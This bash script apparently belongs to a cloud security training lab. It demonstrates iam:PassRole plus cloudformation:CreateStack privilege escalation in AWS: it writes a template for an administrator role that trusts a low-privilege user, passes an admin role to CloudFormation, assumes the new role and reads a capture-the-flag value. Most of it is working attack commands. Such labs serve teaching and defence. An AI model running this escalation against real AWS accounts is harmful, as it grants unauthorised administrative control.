#!/bin/bash

# Demo script for iam:PassRole + cloudformation:CreateStack privilege escalation
# This script demonstrates how a user with PassRole and CreateStack can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-cloudformation-001-to-admin-starting-user"
ADMIN_ROLE="pl-prod-cloudformation-001-to-admin-cfn-role"
STACK_NAME="pl-prod-cloudformation-001-to-admin-escalation-stack"
ESCALATED_ROLE_NAME="pl-prod-cloudformation-001-to-admin-escalated-role"
TEMPLATE_FILE="/tmp/cfn-cloudformation-001-escalation-template.yaml"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + CloudFormation CreateStack Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_cloudformation_001_iam_passrole_cloudformation.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Create CloudFormation template
echo -e "${YELLOW}Step 5: Creating CloudFormation template for privilege escalation${NC}"
echo "This template will create a new IAM role with admin permissions that trusts our user..."

cat > $TEMPLATE_FILE << EOF
AWSTemplateFormatVersion: '2010-09-09'
Description: 'Privilege Escalation - Creates an admin role that trusts the starting user'

Resources:
  EscalatedRole:
    Type: AWS::IAM::Role
    Properties:
      RoleName: ${ESCALATED_ROLE_NAME}
      Description: 'Escalated role with admin permissions - created via CloudFormation PassRole attack'
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              AWS: arn:aws:iam::${ACCOUNT_ID}:user/${STARTING_USER}
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AdministratorAccess

Outputs:
  EscalatedRoleArn:
    Description: ARN of the escalated admin role
    Value: !GetAtt EscalatedRole.Arn
  EscalatedRoleName:
    Description: Name of the escalated admin role
    Value: !Ref EscalatedRole
EOF

echo "Template created at: $TEMPLATE_FILE"
echo ""
echo -e "${BLUE}Template contents:${NC}"
cat $TEMPLATE_FILE
echo ""
echo -e "${GREEN}✓ CloudFormation template created${NC}\n"

# [EXPLOIT] Step 6: Create CloudFormation stack with PassRole
echo -e "${YELLOW}Step 6: Creating CloudFormation stack with admin role${NC}"
use_starting_creds
echo "This is the privilege escalation vector - passing the admin role to CloudFormation..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin role ARN: $ADMIN_ROLE_ARN"
echo "Stack name: $STACK_NAME"
echo ""

show_attack_cmd "Attacker" "aws cloudformation create-stack --region $AWS_REGION --stack-name $STACK_NAME --template-body file://$TEMPLATE_FILE --role-arn $ADMIN_ROLE_ARN --capabilities CAPABILITY_NAMED_IAM --output text"
aws cloudformation create-stack \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --template-body file://$TEMPLATE_FILE \
    --role-arn $ADMIN_ROLE_ARN \
    --capabilities CAPABILITY_NAMED_IAM \
    --output text

echo -e "${GREEN}✓ CloudFormation stack creation initiated${NC}\n"

# [OBSERVATION] Step 7: Wait for stack creation to complete
echo -e "${YELLOW}Step 7: Waiting for CloudFormation stack to complete${NC}"
use_readonly_creds
echo "This may take 30-60 seconds..."
echo ""

MAX_WAIT=300  # 5 minutes
WAIT_TIME=0
STACK_COMPLETE=false

while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].StackStatus' --output text"
    STACK_STATUS=$(aws cloudformation describe-stacks \
        --region $AWS_REGION \
        --stack-name $STACK_NAME \
        --query 'Stacks[0].StackStatus' \
        --output text 2>/dev/null || echo "NOT_FOUND")

    echo "Stack status: $STACK_STATUS"

    if [ "$STACK_STATUS" = "CREATE_COMPLETE" ]; then
        echo -e "${GREEN}✓ Stack creation complete!${NC}\n"
        STACK_COMPLETE=true
        break
    elif [ "$STACK_STATUS" = "CREATE_FAILED" ] || [ "$STACK_STATUS" = "ROLLBACK_COMPLETE" ]; then
        echo -e "${RED}Error: Stack creation failed${NC}"
        echo "Stack status: $STACK_STATUS"
        show_cmd "Attacker" "aws cloudformation describe-stack-events --region $AWS_REGION --stack-name $STACK_NAME --query 'StackEvents[?ResourceStatus==\`CREATE_FAILED\`]' --output table"
        aws cloudformation describe-stack-events \
            --region $AWS_REGION \
            --stack-name $STACK_NAME \
            --query 'StackEvents[?ResourceStatus==`CREATE_FAILED`]' \
            --output table
        exit 1
    fi

    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

if [ "$STACK_COMPLETE" = false ]; then
    echo -e "${RED}Error: Stack creation did not complete within timeout${NC}"
    exit 1
fi

# [OBSERVATION] Step 8: Get the escalated role ARN from stack outputs
echo -e "${YELLOW}Step 8: Retrieving escalated role ARN from stack outputs${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws cloudformation describe-stacks --region $AWS_REGION --stack-name $STACK_NAME --query 'Stacks[0].Outputs[?OutputKey==\`EscalatedRoleArn\`].OutputValue' --output text"
ESCALATED_ROLE_ARN=$(aws cloudformation describe-stacks \
    --region $AWS_REGION \
    --stack-name $STACK_NAME \
    --query 'Stacks[0].Outputs[?OutputKey==`EscalatedRoleArn`].OutputValue' \
    --output text)

if [ -z "$ESCALATED_ROLE_ARN" ]; then
    # Fallback: construct the ARN manually
    ESCALATED_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ESCALATED_ROLE_NAME}"
fi

echo "Escalated role ARN: $ESCALATED_ROLE_ARN"
echo -e "${GREEN}✓ Retrieved escalated role ARN${NC}\n"

# [EXPLOIT] Step 9: Assume the escalated role
echo -e "${YELLOW}Step 9: Assuming the escalated admin role${NC}"
use_starting_creds
echo "This role was created by CloudFormation and has administrator access..."
echo ""

# Wait a few seconds for IAM to propagate
echo "Waiting for IAM propagation (5 seconds)..."
sleep 5

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ESCALATED_ROLE_ARN --role-session-name escalation-demo --query 'Credentials' --output json"
CREDENTIALS=$(aws sts assume-role \
    --role-arn $ESCALATED_ROLE_ARN \
    --role-session-name escalation-demo \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
# Keep region consistent
export AWS_REGION=$AWS_REGION

# Verify we're now the escalated role
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $ROLE_IDENTITY"
echo -e "${GREEN}✓ Successfully assumed escalated role${NC}\n"

# [EXPLOIT] Step 10: Verify admin access using escalated role session
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
echo ""

show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT]
# Step 11: Capture the CTF flag
# The escalated role has AdministratorAccess, which grants ssm:GetParameter
# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/cloudformation-001-to-admin"
show_attack_cmd "Attacker (escalated role)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Created CloudFormation template defining admin role"
echo "3. Created CloudFormation stack with PassRole to: $ADMIN_ROLE"
echo "4. CloudFormation used admin role to create: $ESCALATED_ROLE_NAME"
echo "5. Assumed escalated role: $ESCALATED_ROLE_ARN"
echo "6. Achieved: Administrator Access"
echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER (PassRole + CreateStack)"
echo -e "  → CloudFormation Stack (using $ADMIN_ROLE)"
echo -e "  → Creates $ESCALATED_ROLE_NAME (with AdministratorAccess)"
echo -e "  → Assume $ESCALATED_ROLE_NAME → Admin"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- CloudFormation Stack: $STACK_NAME"
echo "- Escalated IAM Role: $ESCALATED_ROLE_NAME"
echo "- Template file: $TEMPLATE_FILE"

echo -e "\n${RED}⚠ Warning: The escalated role and CloudFormation stack still exist${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
